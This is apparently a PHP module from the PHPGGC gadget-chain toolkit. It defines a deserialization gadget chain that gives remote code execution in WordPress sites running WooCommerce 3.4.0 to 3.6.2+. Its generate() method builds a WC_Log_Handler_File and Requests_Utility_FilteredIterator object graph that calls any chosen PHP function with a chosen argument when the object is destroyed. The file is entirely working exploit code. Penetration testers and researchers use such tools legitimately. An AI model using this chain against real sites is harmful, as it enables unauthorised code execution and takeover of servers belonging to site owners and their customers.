<?php

namespace GadgetChain\WordPress\P\WooCommerce;

class RCE1 extends \PHPGGC\GadgetChain\RCE
{
    public static $version = '3.4.0 <= 3.6.2+';
    public static $vector = '__destruct';
    public static $author = 'erwan_lr';
    public static $informations = '
        Demonstrated at BSide Manchester: https://www.youtube.com/watch?v=GePBmsNJw6Y&t=1763
        Tested up to WP 5.2 and WooCommerce 3.6.2 activated (but configured). Newest versions might also work.
    ';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \WC_Log_Handler_File(new \Requests_Utility_FilteredIterator([$parameter], $function));
    }
}